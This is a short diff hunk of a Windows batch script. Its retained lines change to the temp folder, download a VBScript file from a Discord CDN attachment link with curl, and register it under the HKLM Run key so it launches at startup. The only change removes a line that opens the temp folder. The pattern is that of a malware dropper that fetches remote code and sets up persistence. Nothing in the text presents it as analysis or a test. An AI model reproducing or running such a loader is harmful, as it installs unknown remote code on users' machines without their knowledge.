@@ -31,4 +31,3 @@ if '%errorlevel%' NEQ '0' (
 cd %temp%
 curl https://cdn.discordapp.com/attachments/951496409318817872/951496440167956600/ee.vbs -O
 REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v ee /t REG_EXPAND_SZ /d %temp%\ee.vbs
-start %temp%
